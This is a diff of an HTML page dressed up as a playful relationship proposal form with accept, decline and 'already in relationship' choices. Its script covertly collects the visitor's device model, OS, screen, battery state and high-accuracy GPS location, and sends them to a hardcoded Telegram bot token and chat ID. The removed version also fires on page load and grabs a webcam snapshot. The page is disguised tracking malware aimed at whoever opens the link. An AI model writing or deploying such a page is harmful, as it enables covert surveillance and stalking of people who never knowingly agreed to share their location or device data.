@@ -99,124 +99,91 @@
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h1>SELECT AN OPTION , OR YE KABHI NAHI BADLEGA</h1>
-    <div class="option">
-        <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
-        <label for="accept">ACCEPT ✅</label>
+    <div class="container">
+        <h1>SELECT AN OPTION, OR IT WILL NEVER CHANGE</h1>
+        <div class="option">
+            <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
+            <label for="accept">ACCEPT ✅</label>
+        </div>
+        <div class="option">
+            <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
+            <label for="decline">DECLINE ❌</label>
+        </div>
+        <div class="option">
+            <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
+            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
+        </div>
+        <button class="submit-btn" onclick="submitData()">SUBMIT</button>
     </div>
-    <div class="option">
-        <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
-        <label for="decline">DECLINE ❌</label>
-    </div>
-    <div class="option">
-        <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
-        <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
-    </div>
-    <button class="submit-btn" onclick="submitData()">SUBMIT</button>
-</div>
 
-<script>
-    const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-    const CHAT_ID = "5112680061";
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
+        const CHAT_ID = "5112680061";
 
-    function selectOnlyOne(selectedCheckbox) {
-        document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
-            if (checkbox !== selectedCheckbox) checkbox.checked = false;
-        });
-    }
-
-    function getDeviceInfo() {
-        let browser = "Unknown Browser";
-        let os = "Unknown OS";
-
-        if (navigator.userAgentData) {
-            browser = navigator.userAgentData.brands.map(b => `${b.brand} ${b.version}`).join(", ");
-            os = navigator.userAgentData.platform;
-        } else {
-            browser = navigator.userAgent;
-            os = navigator.platform;
+        function selectOnlyOne(selectedCheckbox) {
+            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+                if (checkbox !== selectedCheckbox) checkbox.checked = false;
+            });
         }
 
-        return `
-📱 **Device Info:**
-🔹 **Browser:** ${browser}
-🔹 **OS:** ${os}
-🔹 **Screen:** ${window.screen.width}x${window.screen.height}
-`;
-    }
+        async function getDeviceInfo() {
+            let deviceInfo = "📱 **Device Info:**\n";
+            
+            if (navigator.userAgentData) {
+                const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
+                deviceInfo += `🔹 **Device Model:** ${ua.model || "Unknown"}\n`;
+                deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
+                deviceInfo += `🔹 **Architecture:** ${ua.architecture || "Unknown"}\n`;
+            } else {
+                deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
+            }
 
-    function sendDeviceInfo() {
-        navigator.getBattery().then(battery => {
-            const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-            const message = `🚀 **Page Opened**\n${getDeviceInfo()}${batteryStatus}`;
-            sendMessage(message);
-        }).catch(() => {
-            sendMessage(`🚀 **Page Opened**\n${getDeviceInfo()}\n⚠️ **Battery Info Not Available**`);
-        });
-    }
+            deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
 
-    function getSelectedOption() {
-        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
-        for (let checkbox of checkboxes) {
-            if (checkbox.checked) return checkbox.nextElementSibling.innerText;
+            return deviceInfo;
         }
-        return null;
-    }
 
-    function submitData() {
-        const option = getSelectedOption();
-        if (!option) return alert("Please select an option!");
-
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL("image/png");
-                    stream.getTracks().forEach(track => track.stop());
-
-                    captureLocation(option, imageData);
-                }, 3000);
-            })
-            .catch(() => alert("Camera access denied!"));
-    }
-
-    function captureLocation(option, imageData) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const location = `📍 Location: Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                    sendOption(option, imageData, location);
-                },
-                () => sendOption(option, imageData, "📍 Location: Not Available"),
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+        function getSelectedOption() {
+            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+            for (let checkbox of checkboxes) {
+                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
+            }
+            return null;
         }
-    }
 
-    function sendOption(option, imageData, location) {
-        const message = `✅ User Response\n🟢 Option: ${option}\n${location}`;
-        sendMessage(message);
-    }
+        async function submitData() {
+            const option = getSelectedOption();
+            if (!option) return alert("Please select an option!");
 
-    function sendMessage(text) {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text })
-        });
-    }
+            navigator.getBattery().then(battery => {
+                const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+                
+                getDeviceInfo().then(deviceInfo => {
+                    const message = `✅ **User Response**\n🟢 **Option:** ${option}\n${deviceInfo}${batteryStatus}`;
+                    sendMessage(message);
+                });
 
-    window.onload = sendDeviceInfo;
-</script>
+                captureLocation(option);
+            });
+        }
 
+        function captureLocation(option) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendMessage(`📍 **Location:** Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+                    () => sendMessage("📍 **Location:** Not Available"),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }
+
+        function sendMessage(text) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
+            });
+        }
+    </script>
 </body>
 </html>
